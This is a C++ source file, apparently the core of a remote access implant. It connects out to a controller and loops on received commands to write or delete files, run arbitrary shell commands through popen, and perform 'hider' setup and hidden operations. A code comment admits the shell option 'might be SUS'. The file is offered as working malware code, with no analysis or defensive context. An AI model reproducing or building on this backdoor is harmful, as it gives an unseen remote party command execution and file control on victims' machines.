#include <iostream>

#include "Status.h"
#include "client.h"
#include "SoftwareManeger.h"
#include "FunCodes.h"
#include "HiderManeger.h"
#include "HiderCodes.h"

void testSoftwareManeger(void);

int main(int argc, char * argv[]) {
    
    Client client;
    client.createSocket();
    SoftwareManeger swm = SoftwareManeger();
    HiderManeger hiderManager = HiderManeger();
    
    client.sendData("Connected");

    while (true)
    {
        loopIter(client, swm, hiderManager);
    }

    return EXIT_SUCCESS;
}

void testSoftwareManeger() {
    SoftwareManeger swm = SoftwareManeger();
    swm.chunkWrite("tempSwmTest.txt", false, "this is my first test\n");
    swm.chunkWrite("tempSwmTest.txt", 1, "this is my second test\n");
    
    swm.deleteFile("tempSwmTest.txt");

}

Status fileWrite(Client& client, std::string param, SoftwareManeger& swm)
{
    bool cont = true;
    bool isAppend = false;
    char buffer[BUFFER_SIZE] = {0};
    Status res = SUCCSESS;
    
    while (client.recvData(buffer) > 0 && res == SUCCSESS)
    {
        res = swm.chunkWrite(param, isAppend, buffer);
        isAppend = true;
    }
    return res;
}

std::string execBash(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    FILE* pipe = popen(cmd, "r");
    if (!pipe) throw std::runtime_error("popen() failed!");

    while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
        result += buffer.data();
    }

    pclose(pipe);
    return result;
}


void loopIter(Client& client, SoftwareManeger& swm, HiderManeger hiderManeger)
{
    // receive command
    Message msg;
    Status res;
    client.recvCommand(msg);
    uint fncode = msg.fnccode();
    std::string param = msg.param1();

    std::string response = "";
    switch (fncode)
    {
    case WRITE_FILE:
        fileWrite(client, param, swm);
        break;

    case DELETE_FILE:
        res = swm.deleteFile(param);
        break;

    case RUN_BASH:
        response = execBash(param.c_str()); // maybe we shoud abandon this option, it might be SUS
        break;

    case HIDER_SETUP:
        hiderManeger.setUpHider(param);
        break;
    }
    // hidden handling
    if (fncode & HIDDEN_OPRATION) {
        res = hiderManeger.hiddenAction(fncode, param, client);
    }
    
    // TODO change such that there will be response only if we want it to be 
    Message msgres;
    msgres.set_fnccode(res);
    msgres.set_param1(response);
    client.sendCommand(msgres);
}
